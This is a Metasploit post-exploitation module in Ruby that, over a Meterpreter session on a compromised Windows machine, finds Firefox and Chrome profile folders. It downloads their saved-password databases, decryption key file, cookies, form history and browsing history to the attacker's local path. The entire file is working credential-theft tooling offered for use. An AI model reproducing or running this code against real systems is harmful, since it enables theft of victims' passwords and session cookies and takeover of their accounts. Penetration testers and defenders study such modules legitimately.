##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

#########
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'set'

#########
class MetasploitModule < Msf::Post
 
         include Msf::Post::File
         include Msf::Post::Common
         include Msf::Post::Windows::Priv

#########

def initialize(info = {})
	super(update_info(info,
	'Name'         => 'multi_browser_creds_dump [Webbrowsers passwords]',
	'Description'  => %q{
		This module gets passwords from Firefox and Google Chrome
	},
	'License'        => 'UNKNOWN_LICENSE',
	'Platform'       => ['win'],
	'SessionTypes'   => ['meterpreter'],
	'Author'         => ['r00t-3xp10it, Milton-barra'],
        'DisclosureDate' => 'mai 6 2017',

    
	'DefaultOptions' =>
		{
			'SESSION' => '1',
			'DOWNLOAD_PATH' => '/root',
		}
        ))

	register_options(
	[
		OptBool.new('FIREFOX', [false, 'Get Firefox passwords', false]),
		OptBool.new('CHROME', [false, 'Get Google Chrome passwords', false]),
		OptString.new('SESSION', [ true, 'The session number to run this module on']),
		OptString.new('DOWNLOAD_PATH', [false, 'default logs download location (local)'])
	], self.class)  
end


# ------------------------
# DUMP DATA FROM FIREFOX
# -----------------------
def firefox

	# variable declarations
	profile =''
	pathexe_firefox = "%programfiles%\\Mozilla Firefox\\firefox.exe"
	outpath = datastore['DOWNLOAD_PATH']
	path ="%appdata%\\Mozilla\\Firefox"
  	# check for proper settings enter by user ...
	if datastore['FIREFOX'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
		print_error("Please set FIREFOX | DOWNLOAD_PATH options ..")
		return
	else
		print_status("Searching for Firefox path ..")
	end

	#check if firefox.exe exists
	if session.fs.file.exist?(pathexe_firefox)
		print_good(" Firefox directoy found.")
	else
		print_error("Firefox path not found.")
		return
	end

	# check if file exist on target system
	if session.fs.file.exist?(path + "\\profiles.ini")		

		# download file from target system
		client.fs.file.download("#{outpath}/profiles.ini","#{path}\\profiles.ini")

		# regex to find directory of default profile
		profile_path = File.read("#{outpath}/profiles.ini")
		profile_path.scan(/Path=Profiles\/(.*)\r/) do |match|
			profile_path = match
		end
		final_path = path + "\\Profiles\\#{profile_path[0]}#{profile_path[1]}"
		File.delete("#{outpath}/profiles.ini")
		print_good(" Found default profile directory.")
	else 
		print_error("Firefox path not found.")
		return
	end
	
	credsfirefox = [
		'places.sqlite',
		'key3.db',
		'logins.json',
		'cookies.sqlite',
		'permissions.sqlite',
		'formhistory.sqlite'
	]

	# loop funtion to download files from target system
	session.response_timeout=120 
	credsfirefox.each do |dump|
		if session.fs.file.exist?("#{final_path}\\#{dump}")
			r = client.fs.file.download("#{outpath}/#{sysinfo['Computer']}/Firefox/#{dump}","#{final_path}\\#{dump}")
			print_status("  Downloading => #{dump}")
		else
			next
		end
	end
	print_good(" Files downloaded successfully.")
	print_line("")

	rescue ::Exception => e
		#print_error("Error Running Command: #{e.class} #{e}")
		print_error("Error copying the file.")
end



# ---------------------
# DUMP DATA FROM CHROME
# ---------------------
def google_chrome

	r=''
	# variable declarations
	outpath = datastore['DOWNLOAD_PATH']
	sysnfo = session.sys.config.sysinfo
	pathexe="%programfiles%\\Google\\Chrome\\Application\\chrome.exe"
	#print_line("#{pathexe}")
	datapath="%homepath%\\AppData\\Local\\Google\\Chrome\\User Data\\Default"

	# check for proper settings enter by user ...
	if datastore['CHROME'] == 'nil' || datastore['DOWNLOAD_PATH'] == 'nil'
		print_error("Please set CHROME | DOWNLOAD_PATH options...")
		return
	else
		print_status("Searching for Google Chrome path...")
	end
	
	#check if chrome.exe exists
	if session.fs.file.exist?(pathexe)
		print_good(" Google Chrome directoy found.")
	else
		print_error("Google Chrome path not found.")
		return
	end

	# list of arrays to be executed
	creds = [
		'History',
		'Login Data',
		'Cookies',
		'Web Data'
	]


	# loop funtion to download files from target system
	session.response_timeout=120 
	creds.each do |dump|
		if session.fs.file.exist?("#{datapath}\\#{dump}")
			r = client.fs.file.download("#{outpath}/#{sysnfo['Computer']}/Google Chrome/#{dump}","#{datapath}\\#{dump}")
			print_status("  Downloading => #{dump}")			
		else		
			next
		end
	end
	print_good(" Files downloaded successfully.")
	print_line("")
	# error exception funtion
	rescue ::Exception => e
		#print_error("Error Running Command: #{e.class} #{e}")
		print_error("  Error copying the file.")
end



#
# MAIN MENU DISPLAYS
#
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    |   multi browser creds dump [dump passwords]  |")
    print_line("    |     Author : r00t-3xp10it | Milton-barra     |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    #
    # check for proper session (meterpreter) the non-return of sysinfo command
    # reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
      return nil
    end
    #
    # elevate session privileges befor runing options
    #
    client.sys.config.getprivs.each do |priv|
    end



#
# Selected settings to run
#
   
	if datastore['FIREFOX'] 
		firefox # jump to firefox funtion
	end	

	if datastore['CHROME']
		google_chrome # jump to google chrome function
	end
    end
end
